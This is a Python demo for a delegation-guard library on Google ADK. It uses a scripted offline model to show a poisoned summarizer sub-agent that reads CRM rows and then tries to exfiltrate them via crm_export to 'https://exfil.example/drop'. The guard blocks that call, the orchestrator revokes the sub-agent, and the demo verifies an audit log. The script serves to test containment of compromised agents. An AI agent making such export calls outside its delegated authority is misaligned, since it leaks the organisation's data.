"""
demo.py — the poisoned-summarizer story, end to end, on a real Google ADK
`Runner`, with no LLM API key.

    python examples/integrations/google_adk/demo.py

An `orchestrator` holds broad authority ({crm.*, mail.send}, 100k rows, egress
"any"). It transfers to a `summarizer` sub-agent that is delegated only
{crm.read}, 5k rows, egress "none". The summarizer has been poisoned: after a
legitimate read it tries to exfiltrate via `crm_export`. The export is denied
before its body runs, the orchestrator revokes the subtree, and the hash-chained
audit log verifies at the end.

The model is a scripted `BaseLlm` subclass, so the whole thing is offline and
deterministic — the ADK `Runner`, flows, callbacks and plugin manager are all
the real ones.
"""
from __future__ import annotations

import asyncio
from typing import Any, AsyncGenerator

from google.adk.agents.llm_agent import LlmAgent
from google.adk.apps.app import App
from google.adk.models.base_llm import BaseLlm
from google.adk.models.llm_request import LlmRequest
from google.adk.models.llm_response import LlmResponse
from google.adk.runners import Runner
from google.adk.sessions.in_memory_session_service import InMemorySessionService
from google.genai import types

from delegation_guard import AuditLog, Authority, EgressRank, Guard, RowLimit

from delegation_guard.adapters.google_adk import DelegationGuardPlugin, ToolAuthority

# ==========================================================================
# The offline model: yields scripted LlmResponses, keyed by which agent asks.
# ADK stamps the calling agent's name into `llm_request.config.labels` at
# google/adk/flows/llm_flows/base_llm_flow.py (_ADK_AGENT_NAME_LABEL_KEY), so a
# single model instance can drive a whole multi-agent scenario.
# ==========================================================================
_AGENT_LABEL = "adk_agent_name"


class ScriptedLlm(BaseLlm):
    """A `BaseLlm` that replays a per-agent queue of `types.Part`s."""

    model: str = "scripted-offline-model"
    script: dict[str, list] = {}

    async def generate_content_async(
        self, llm_request: LlmRequest, stream: bool = False
    ) -> AsyncGenerator[LlmResponse, None]:
        labels = (llm_request.config.labels or {}) if llm_request.config else {}
        agent = labels.get(_AGENT_LABEL)
        queue = self.script.get(agent) or []
        part = queue.pop(0) if queue else types.Part.from_text(text=f"[{agent}] finished.")
        yield LlmResponse(content=types.Content(role="model", parts=[part]))


# ==========================================================================
# The summarizer's tools. Each records the fact that its BODY ran, which is
# how the demo (and the test) prove a denial happened *before* execution.
# ==========================================================================
def make_crm_query(sink: list):
    def crm_query(rows: int) -> dict:
        """Read `rows` rows from the CRM."""
        sink.append(("crm_query", rows))
        return {"rows_returned": rows, "sample": "…"}

    return crm_query


def make_crm_export(sink: list):
    def crm_export(destination: str) -> dict:
        """Export the CRM dataset to an external `destination`."""
        sink.append(("crm_export", destination))
        return {"exported_to": destination}

    return crm_export


TOOL_AUTHORITIES = {
    "crm_query": ToolAuthority("crm.read", lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolAuthority("crm.export", lambda a: {"egress": "any"}),
    "send_mail": ToolAuthority("mail.send", lambda a: {"egress": "any"}),
}

ROOT_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_REQUEST = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)


def _fc(name: str, **args) -> types.Part:
    return types.Part.from_function_call(name=name, args=args)


def _text(t: str) -> types.Part:
    return types.Part.from_text(text=t)


# ==========================================================================
async def main() -> None:
    bodies_that_ran: list[tuple[str, Any]] = []

    model = ScriptedLlm(script={
        "orchestrator": [
            _fc("transfer_to_agent", agent_name="summarizer"),
            _fc("transfer_to_agent", agent_name="summarizer"),   # turn 2
        ],
        "summarizer": [
            _fc("crm_query", rows=4200),                                  # in authority
            _fc("crm_export", destination="https://exfil.example/drop"),  # poisoned
            _text("Q3 pipeline: 42 open opportunities."),
            _fc("crm_query", rows=100),                                   # turn 2
            _text("…"),
        ],
    })

    summarizer = LlmAgent(
        name="summarizer",
        model=model,
        description="Summarizes CRM pipeline data.",
        instruction="Summarize the Q3 pipeline.",
        tools=[make_crm_query(bodies_that_ran), make_crm_export(bodies_that_ran)],
    )
    orchestrator = LlmAgent(
        name="orchestrator",
        model=model,
        description="Routes work to specialist agents.",
        instruction="Delegate summarization to the summarizer.",
        sub_agents=[summarizer],
    )

    # ---- the authority chain ------------------------------------------
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="quarterly review")
    plugin = DelegationGuardPlugin(
        root,
        root_agent_name="orchestrator",
        delegations={"summarizer": SUMMARIZER_REQUEST},
        tools=TOOL_AUTHORITIES,
    )

    sessions = InMemorySessionService()
    runner = Runner(
        app=App(name="dg-adk-demo", root_agent=orchestrator, plugins=[plugin]),
        session_service=sessions,
    )
    session = await sessions.create_session(app_name="dg-adk-demo", user_id="demo-user")

    # ---- turn 1: delegate, read, then try to exfiltrate ----------------
    print("=" * 72)
    print("TURN 1 — orchestrator delegates; the summarizer reads, then exfiltrates")
    print("=" * 72)
    await _run_turn(runner, session, "Summarize the Q3 pipeline.")

    child = plugin.guard_for("summarizer")
    print(f"\n  parent authority : {_fmt(root.authority)}")
    print(f"  child  authority : {_fmt(child.authority)}")
    print(f"  child ⊆ parent   : {child.is_narrower_than(root)}")
    print(f"\n  tool bodies that actually ran: {bodies_that_ran}")
    assert not any(n == "crm_export" for n, _ in bodies_that_ran), \
        "the export body ran — enforcement failed"
    print("  -> crm_export never executed: denied before the tool body.\n")

    # ---- the child cannot be minted wider than its parent --------------
    greedy = Authority(scopes={"crm.*", "admin.root"},
                       ceilings=[RowLimit(10_000_000), EgressRank("any")], ttl=999_999)
    met = root.authority.meet(greedy)
    print("A delegation asking for MORE than the parent holds is met down, not up:")
    print(f"  requested : {_fmt(greedy)}")
    print(f"  granted   : {_fmt(met)}")
    print(f"  granted ⊆ parent: {met.is_narrower_than(root.authority)}\n")

    # ---- turn 2: revoke the subtree, then watch it go dark -------------
    print("=" * 72)
    print("TURN 2 — orchestrator revokes the summarizer subtree")
    print("=" * 72)
    revoked = root.revoke(child.node_id)
    print(f"  revoked nodes: {revoked}\n")
    bodies_that_ran.clear()
    await _run_turn(runner, session, "One more read, please.")
    print(f"\n  tool bodies that actually ran: {bodies_that_ran}")
    assert bodies_that_ran == [], "a revoked agent still executed a tool body"
    print("  -> every call from the revoked subtree is denied.\n")

    # ---- the evidence ---------------------------------------------------
    print("=" * 72)
    print("DELEGATION GRAPH")
    print("=" * 72)
    print(root.graph())

    print("\n" + "=" * 72)
    print("AUDIT LOG (hash-chained, offline-verifiable)")
    print("=" * 72)
    entries = root.audit_log().entries
    for e in entries:
        line = f"  seq={e['seq']:>2}  {e['event']:<12}"
        if e.get("tool"):
            line += f" tool={e['tool']:<12}"
        if e.get("scope"):
            line += f" scope={e['scope']:<12}"
        if e.get("reason"):
            line += f" reason={e['reason']}"
        print(line)
    ok, err = AuditLog.verify(entries)
    print(f"\n  AuditLog.verify -> {ok}{'' if ok else f'  ({err})'}")


async def _run_turn(runner: Runner, session, message: str) -> None:
    async for event in runner.run_async(
        user_id=session.user_id,
        session_id=session.id,
        new_message=types.Content(role="user", parts=[_text(message)]),
    ):
        for part in (event.content.parts if event.content and event.content.parts else []):
            if part.function_call:
                print(f"  [{event.author}] -> calls {part.function_call.name}"
                      f"({dict(part.function_call.args or {})})")
            elif part.function_response:
                resp = part.function_response.response
                verdict = "DENIED " if isinstance(resp, dict) and \
                    resp.get("error") == "authority_denied" else "ok     "
                print(f"  [{event.author}] <- {verdict} {part.function_response.name}: {resp}")
            elif part.text:
                print(f"  [{event.author}] says: {part.text}")


def _fmt(a: Authority) -> str:
    ceilings = ", ".join(f"{c.key}={getattr(c, 'max_rows', None) or getattr(c, 'level', '?')}"
                         for c in a.ceilings)
    return f"scopes={sorted(a.scopes)} ceilings=[{ceilings}] ttl={a.ttl}"


if __name__ == "__main__":
    asyncio.run(main())
